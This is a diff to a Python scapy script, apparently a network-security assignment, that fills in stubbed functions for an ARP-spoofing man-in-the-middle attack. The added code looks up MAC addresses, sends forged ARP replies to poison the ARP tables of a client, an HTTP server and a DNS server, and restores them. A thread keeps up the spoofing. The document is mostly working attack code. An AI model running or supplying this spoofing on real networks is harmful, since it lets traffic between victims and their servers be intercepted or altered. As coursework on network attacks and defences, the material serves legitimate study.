@@ -24,6 +24,9 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
+	response = sr1(arp_pack)
+	return response.getlayer(ARP).hwsrc
 
 
 #ARP spoofs client, httpServer, dnsServer
@@ -36,14 +39,18 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
         time.sleep(interval)
 
 
-# TODO: spoof ARP so that dst changes its ARP table entry for src 
+# TODO: spoof ARP so that dst changes its ARP table entry for src
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
+    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
+    sr1(arp_pack, timeout=10)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
+    sr1(arp_pack, timeout=10)
 
 
 # TODO: handle intercepted packets
@@ -58,15 +65,18 @@ if __name__ == "__main__":
         conf.verb = 0 # minimize scapy verbosity
     conf.iface = args.interface # set default interface
 
+    attackerIP = get_if_addr(args.interface)
     clientIP = args.clientIP
     httpServerIP = args.httpIP
     dnsServerIP = args.dnsIP
-    attackerIP = get_if_addr(args.interface)
 
-    clientMAC = mac(clientIP)
-    httpServerMAC = mac(httpServerIP)
-    dnsServerMAC = mac(dnsServerIP)
     attackerMAC = get_if_hwaddr(args.interface)
+    clientMAC = mac(clientIP)
+    #print("clientMAC: " + clientMAC)
+    httpServerMAC = mac(httpServerIP)
+    #print("httpServerMAC: " + httpServerMAC)
+    dnsServerMAC = mac(dnsServerIP)
+    #print("dnsServerMAC: " + dnsServerMAC)
 
     # start a new thread to ARP spoof in a loop
     spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
